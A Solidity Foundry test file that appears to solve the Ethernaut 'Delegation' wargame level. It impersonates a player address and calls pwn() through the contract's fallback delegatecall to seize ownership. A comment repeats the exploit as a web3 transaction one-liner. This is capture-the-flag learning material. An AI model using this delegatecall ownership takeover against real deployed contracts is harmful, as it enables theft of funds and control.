// SPDX-License-Identifier: UNLICENSED

// forge test --contracts src/test/Delegation.t.sol --fork-url $rpc -vvvv
// sendTransaction({ from: player, to: contract.address, data: web3.utils.sha3("pwn()").substring(0, 10)})
pragma solidity ^0.6.0;

import "ds-test/test.sol";
import "forge-std/console.sol";
import "forge-std/Vm.sol";
import "../Delegation.sol";

contract DelegationTest is DSTest {
    Delegation obj;
    Vm vm = Vm(HEVM_ADDRESS);
    address player_address;
    address contract_address;
    function setUp() public {    
        contract_address = 0x624f59Eb01E0272A640081d58e9fE1e282dA7153;
        player_address = 0xae22f26D5ddfE22d24aA28AEB1D44c962c673438;
        obj = Delegation(contract_address);
    }

    function testClaimOwnership() public {
        vm.startPrank(player_address);
        console.log("Contract Address =", contract_address);
        console.log("Delegation owner =", obj.owner());
        (bool success, ) = address(obj).call(abi.encodeWithSignature("pwn()"));
        require(success, "Failed tx");
        console.log("Delegation owner =", obj.owner());
        assert(obj.owner() == player_address);
        vm.stopPrank();
    }
}
